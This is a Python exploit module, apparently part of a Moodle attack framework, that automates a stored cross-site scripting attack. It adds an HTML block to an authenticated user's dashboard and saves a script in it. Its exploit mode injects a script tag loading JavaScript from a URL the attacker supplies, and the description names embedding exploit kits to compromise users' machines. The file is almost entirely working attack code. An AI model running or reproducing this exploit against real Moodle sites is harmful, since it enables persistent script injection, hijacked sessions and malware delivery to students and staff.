'''
@Title:
Dashboard Stored XSS

@Author:
cyberaz0r

@Description:
It is possible to insert Javascript code in the dashboard of every authenticated user by abusing the HTML Element feature.
This allows an attacker who already compromised an user's Moodle account to escalate into greater goals, such as compromising the user's machine by embedding exploit kits inside Moodle, making Moodle a threat actor for the user's total compromise.
'''


enabled = True


import requests
from bs4 import BeautifulSoup

# suppress requests insecure warning
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


# parse ID of HTML element from dashboard page
def get_html_element_id(content):
	for h5 in BeautifulSoup(content, 'html.parser').find_all('h5'):
		if 'HTML' in h5.get_text():
			return h5['id'].split('instance-')[1].split('-')[0]
	return False



def inject(url, sess, payload, verbose, check_mode=False):
	try:
		sesskey = sess.get(url + '/my/').text.split('<input type="hidden" name="sesskey" value="')[1].split('"')[0]
	except IndexError:
		print('[X] Error while retrieving sesskey on dashboard')
		return False
	
	# enable dashboard editing mode
	if verbose > 1: print('[*] Adding HTML Element')
	sess.post(url + '/my/', data={'edit':'1', 'sesskey':sesskey})
	
	# add HTML element and get its ID
	if sess.get('{}/my/?bui_addblock&sesskey={}&bui_addblock=html'.format(url, sesskey), allow_redirects=False).status_code != 303:
		print('[X] Error while adding HTML Element')
		return False
	
	elementid = get_html_element_id(sess.get(url + '/my/').text)
	if not elementid:
		print('[X] Error while getting HTML Element ID')
		return False
	
	print('[+] Successfully added HTML Element')
	
	# insert javascript code inside HTML element
	if verbose > 1: print('[*] Saving payload into HTML Element')
	itemid = sess.get(url + '/my/index.php?bui_editid=' + elementid).text.split('<input type="hidden" name="config_text[itemid]" value="')[1].split('"')[0]
	
	if sess.post(
		url + '/my/',
		data = {
			'bui_editid' : elementid,
			'sesskey' : sesskey,
			'_qf__block_html_edit_form' : '1',
			'mform_isexpanded_id_configheader' : '1',
			'mform_isexpanded_id_whereheader' : '0',
			'mform_isexpanded_id_onthispage' : '0',
			'config_title' : '',
			'config_text[text]' : payload,
			'config_text[format]' : '1',
			'config_text[itemid]' : itemid,
			'bui_defaultregion' : 'side-pre',
			'bui_defaultweight' : '6',
			'bui_visible' : '1',
			'bui_region' : 'side-pre',
			'bui_weight' : '6',
			'submitbutton' : 'Save changes'
		},
		allow_redirects = False
	).status_code != 303:
		print('[X] Error while saving payload in HTML Element')
		return False
	
	if payload not in sess.get(url+'/my/').text:
		print('[X] Adding HTML Element failed')
		return False
	
	print('[+] Successfully saved payload in HTML Element')
	
	# if in check mode remove HTML element
	if check_mode:
		if verbose > 1: print('[*] Removing added HTML Element')
		
		if sess.post(url+'/my/', data={'bui_deleteid':elementid, 'sesskey':sesskey, 'bui_confirm':'1'}, allow_redirects=False).status_code != 303:
			print('[X] Error while removing added HTML Element')
			return False
		
		print('[+] Successfully removed added HTML Element')
	
	# disable dashboard editing mode
	if sess.post(url + '/my/', data={'edit':'', 'sesskey':sesskey}).status_code != 200:
		print('[X] Error while restoring moodle Dashboard')
		return False
	
	if verbose > 1: print('[+] Restored dashboard')
	
	return True


# check mode: insert hardcoded script, check if injected and then remove it
def check(args, sess, version):
	if args.auth is None:
		print('[-] Vulnerability "{}" requires authentication, skipping...'.format(__name__.split('.', 1)[1]))
		return False
	
	return inject(args.url, sess, '<script>alert(\'vulnerable!\')</script>', args.verbose, True)

# exploit mode: inject payload to include javascript code from a remote file
def exploit(args, sess, version):
	script_url = input('[?] Insert URL of the script that has to be executed in the XSS payload: ')
	payload = '<script src="{}"></script>'.format(script_url)
	inject(args.url, sess, payload, args.verbose)
